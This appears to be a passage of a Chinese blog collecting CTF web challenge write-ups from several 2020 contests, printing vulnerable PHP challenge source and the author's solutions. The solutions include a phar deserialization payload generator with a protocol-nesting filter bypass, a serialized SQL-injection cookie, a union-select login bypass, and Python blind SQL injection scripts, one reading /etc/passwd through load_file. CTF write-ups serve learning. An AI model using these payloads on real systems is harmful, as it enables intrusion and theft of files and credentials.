class="string">"nooooooooooo!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i"</span>,$filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Invid Schema!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span><span class="params">($name,$val)</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>answer:<br>通过上传phar文件，然后再嵌套读取  </p><p>利用如下代码生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $nickname;</span><br><span class="line">    <span class="keyword">public</span> $backup=<span class="string">'/flag'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dbCtrl = <span class="keyword">new</span> dbCtrl();</span><br><span class="line">$user = <span class="keyword">new</span> User();</span><br><span class="line">$dbCtrl-&gt;token = $user;</span><br><span class="line">$user-&gt;nickname = <span class="keyword">new</span> Reader();</span><br><span class="line"></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"vul.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER();?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($dbCtrl);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传，然后读取这里开头过滤了phar,可以嵌套协议   </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://phar://[phar文件]  读取</span><br></pre></td></tr></table></figure><h1 id="西湖论剑"><a href="#西湖论剑" class="headerlink" title="西湖论剑"></a>西湖论剑</h1><h2 id="easyjson"><a href="#easyjson" class="headerlink" title="easyjson"></a>easyjson</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'security.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">$sandbox = <span class="string">'sandbox/'</span>.sha1($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]).<span class="string">'/'</span>;</span><br><span class="line">var_dump($sandbox);</span><br><span class="line"><span class="keyword">if</span>(!file_exists($sandbox))&#123;</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    file_put_contents($sandbox.<span class="string">"index.php"</span>,<span class="string">"&lt;?php echo 'Welcome To Dbapp OSS.';?&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">$content = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($action == <span class="string">"write"</span> &amp;&amp;  SecurityCheck(<span class="string">'filename'</span>,$_GET[<span class="string">'filename'</span>]) &amp;&amp;SecurityCheck(<span class="string">'content'</span>,$content))&#123;</span><br><span class="line">    $content = json_decode($content);</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    $filecontent = $content-&gt;content;</span><br><span class="line">    $filename = $sandbox.$filename;</span><br><span class="line">    file_put_contents($filename,$filecontent.<span class="string">"\n Powered By Dbapp OSS."</span>);</span><br><span class="line">&#125;<span class="keyword">elseif</span>($action == <span class="string">"reset"</span>)&#123;</span><br><span class="line">    $files = scandir($sandbox);</span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir($file))&#123;</span><br><span class="line">            <span class="keyword">if</span>($file !== <span class="string">"index.php"</span>)&#123;</span><br><span class="line">                unlink($sandbox.$file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Security Check Failed.'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解答<br><a href="http://www.plasf.cn/articles/2a808de4a49b19.html" target="_blank" rel="noopener">http://www.plasf.cn/articles/2a808de4a49b19.html</a> </p><h1 id="nesec"><a href="#nesec" class="headerlink" title="nesec"></a>nesec</h1><h2 id="WARMUP"><a href="#WARMUP" class="headerlink" title="WARMUP"></a>WARMUP</h2><p>index.php </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ($_COOKIE[<span class="string">'last_login_info'</span>])) &#123;</span><br><span class="line">    $last_login_info = unserialize (base64_decode ($_COOKIE[<span class="string">'last_login_info'</span>]));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($last_login_info) &amp;&amp; $last_login_info[<span class="string">'ip'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'WAF info: your ip status has been changed, you are dangrous.'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $cookie = base64_encode (serialize (<span class="keyword">array</span> ( <span class="string">'ip'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>]))) ;</span><br><span class="line">    setcookie (<span class="string">'last_login_info'</span>, $cookie, time () + (<span class="number">86400</span> * <span class="number">30</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line">$table = <span class="string">'users'</span>;</span><br><span class="line">$username = addslashes($_POST[<span class="string">'username'</span>]);</span><br><span class="line">$password = addslashes($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="keyword">new</span> SQL();</span><br><span class="line">$sql-&gt;connect();</span><br><span class="line">$sql-&gt;table = $table;</span><br><span class="line">    $sql-&gt;username = $username;</span><br><span class="line">    $sql-&gt;password = $password;</span><br><span class="line">    $sql-&gt;check_login();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>conn.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $table = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>, <span class="string">"xxxxx"</span>, <span class="string">"xxxx"</span>, <span class="string">"xxxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_login</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $result = <span class="keyword">$this</span>-&gt;query();</span><br><span class="line">        <span class="keyword">if</span> ($result === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"database error, please check your input"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span>($row === <span class="keyword">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"username or password incorrect!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">'username'</span>] === <span class="string">'admin'</span>)&#123;</span><br><span class="line">            $flag = file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"welcome, admin! this is your flag -&gt; "</span>.$flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"welcome! but you are not admin"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $result-&gt;free();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;waf();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;conn-&gt;query (<span class="string">"select username,password from "</span>.<span class="keyword">$this</span>-&gt;table.<span class="string">" where username='"</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">"' and password='"</span>.<span class="keyword">$this</span>-&gt;password.<span class="string">"'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $blacklist = [<span class="string">"union"</span>, <span class="string">"join"</span>, <span class="string">"!"</span>, <span class="string">"\""</span>, <span class="string">"#"</span>, <span class="string">"$"</span>, <span class="string">"%"</span>, <span class="string">"&amp;"</span>, <span class="string">"."</span>, <span class="string">"/"</span>, <span class="string">":"</span>, <span class="string">";"</span>, <span class="string">"^"</span>, <span class="string">"_"</span>, <span class="string">"`"</span>, <span class="string">"&#123;"</span>, <span class="string">"|"</span>, <span class="string">"&#125;"</span>, <span class="string">"&lt;"</span>, <span class="string">"&gt;"</span>, <span class="string">"?"</span>, <span class="string">"@"</span>, <span class="string">"["</span>, <span class="string">"\\"</span>, <span class="string">"]"</span> , <span class="string">"*"</span>, <span class="string">"+"</span>, <span class="string">"-"</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</span><br><span class="line">    <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;table, $value))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;username, $value))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strripos(<span class="keyword">$this</span>-&gt;password, $value))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">'bad hacker,go out!'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="keyword">$this</span>-&gt;conn)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;connect ();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;table)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;waf();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;check_login();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;conn-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ip.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br></pre></td></tr></table></figure><p>answer.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SQL</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $table = <span class="string">"users"</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"\\"</span>;</span><br><span class="line">    <span class="keyword">public</span> $password = <span class="string">"or username='admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> SQL();</span><br><span class="line">$poc = base64_encode (serialize (<span class="keyword">array</span> ( <span class="string">'ip'</span> =&gt; <span class="string">"221.219.243.115"</span>, <span class="string">'hack'</span>=&gt;$a)));</span><br><span class="line"><span class="keyword">echo</span> $poc;</span><br></pre></td></tr></table></figure><h3 id="SSRF-ME"><a href="#SSRF-ME" class="headerlink" title="SSRF ME"></a>SSRF ME</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_captcha</span><span class="params">(captcha)</span>:</span></span><br><span class="line">    md5 = hashlib.md5()</span><br><span class="line">    md5.update(captcha.encode())</span><br><span class="line">    s = md5.hexdigest()[<span class="number">-6</span>:]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">1000000000</span>):</span><br><span class="line">    <span class="keyword">if</span> get_captcha(str(i)) == <span class="string">"3f631f"</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="../../images/game/2020/nssc/1.jpg" alt=""></p><h2 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//a "part" of the source code here</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqlWaf</span><span class="params">($s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $filter = <span class="string">'/xml|extractvalue|regexp|copy|read|file|select|between|from|where|create|grand|dir|insert|link|substr|mid|server|drop|=|&gt;|&lt;|;|"|\^|\||\ |\'/i'</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter,$s))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'VerifyCode'</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"?"</span>);</span><br><span class="line"></span><br><span class="line">    $username = strval($_POST[<span class="string">'username'</span>]);</span><br><span class="line">    $password = strval($_POST[<span class="string">'password'</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !sqlWaf($password) )</span><br><span class="line">        alertMes(<span class="string">'damn hacker'</span> ,<span class="string">"./index.php"</span>);</span><br><span class="line"></span><br><span class="line">    $sql = <span class="string">"SELECT * FROM users WHERE username='$&#123;username&#125;' AND password= '$&#123;password&#125;'"</span>;</span><br><span class="line"><span class="comment">//    password format: /[A-Za-z0-9]/</span></span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">if</span> ( $row[<span class="string">'username'</span>] === <span class="string">'admin'</span> &amp;&amp; $row[<span class="string">'password'</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ($row[<span class="string">'password'</span>] == $password)</span><br><span class="line">            &#123;</span><br><span class="line">                $message = $FLAG;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $message = <span class="string">"username or password wrong, are you admin?"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $message = <span class="string">"wrong user"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $message = <span class="string">"user not exist or wrong password"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>answer</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1111<span class="string">'+union+select+1,'</span>admin<span class="string">','</span>admin<span class="string">'%23&amp;password=admin&amp;captcha=NZZ</span></span><br></pre></td></tr></table></figure><h2 id="easql-sql"><a href="#easql-sql" class="headerlink" title="easql_sql"></a>easql_sql</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">and_operation</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://124.71.148.26:30022/"</span></span><br><span class="line">flag_payload=  <span class="string">"admin') and if((ascii(substr((select * from security.flag limit 0,1),&#123;0&#125;,1))&amp;&#123;1&#125;),sleep(2),1) -- "</span></span><br><span class="line">info=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">42</span>):</span><br><span class="line">value=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">payload=flag_payload.format(j,<span class="number">2</span>**k)</span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">"uname"</span>: payload,</span><br><span class="line"><span class="string">"passwd"</span>:<span class="string">"ye1s"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line">requests.post(url=url, data=data)</span><br><span class="line">end_time = time.time()</span><br><span class="line">spend_time = end_time - start_time</span><br><span class="line"><span class="keyword">if</span> spend_time&gt;=<span class="number">2</span>:</span><br><span class="line">value=value+(<span class="number">2</span>**k)</span><br><span class="line"><span class="keyword">if</span> value==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">info=info+chr(value)</span><br><span class="line">print(info)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">and_operation()</span><br></pre></td></tr></table></figure><h1 id="太湖杯"><a href="#太湖杯" class="headerlink" title="太湖杯"></a>太湖杯</h1><h2 id="checkInGame"><a href="#checkInGame" class="headerlink" title="checkInGame"></a>checkInGame</h2><p>以为打完游戏，应该是不可能的，所以可以看一下调用的类和方法，看那个是玩游戏成功，会调用的方法，直接调用，即可得到flag<br><img src="../../images/game/2020/taihuibei/1.png" alt=""></p><h2 id="CrossFire"><a href="#CrossFire" class="headerlink" title="CrossFire"></a>CrossFire</h2><p>十六进制转ASCII码 <a href="https://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">https://www.bejson.com/convert/ox2str/</a><br>通过盲注得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">and_operation</span><span class="params">()</span>:</span></span><br><span class="line">url=<span class="string">"http://122.112.249.228:10084/index.php?id=193"</span></span><br><span class="line">flag_payload= <span class="string">" and ascii(substr((select hex(load_file(0x2f6574632f706173737764))),&#123;0&#125;,1))%26&#123;1&#125; -- "</span></span><br><span class="line"></span><br><span class="line">info=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1100</span>):</span><br><span class="line">value=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">payload=flag_payload.format(j,<span class="number">2</span>**k)</span><br><span class="line"><span class="comment">#data=&#123;</span></span><br><span class="line"><span class="comment">#"uname": payload,</span></span><br><span class="line"><span class="comment">#"passwd":"ye1s"</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">res=requests.get(url=url+payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"&lt;img src='"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">value=value+(<span class="number">2</span>**k)</span><br><span class="line"><span class="keyword">if</span> value==<span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">info=info+chr(value)</span><br><span class="line">print(info)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span 